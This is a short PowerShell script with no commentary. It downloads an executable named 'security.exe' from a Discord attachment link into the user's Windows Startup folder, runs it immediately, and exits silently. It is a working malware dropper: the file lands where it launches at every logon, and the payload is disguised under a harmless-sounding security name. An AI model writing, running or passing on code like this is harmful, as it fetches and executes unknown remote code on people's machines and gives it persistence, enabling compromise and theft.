$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://cdn.discordapp.com/attachments/1209632213742657576/1345432361558605975/security.exe?ex=67c48707&is=67c33587&hm=fd4c7eaaa2cb6e851ce9d233cf1c3ba5454523afe0d8c85784de597b8a65226e&"
$outputPath = Join-Path $startupFolder "security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath
& $startupFolder\security.exe
[System.Environment]::Exit(0)
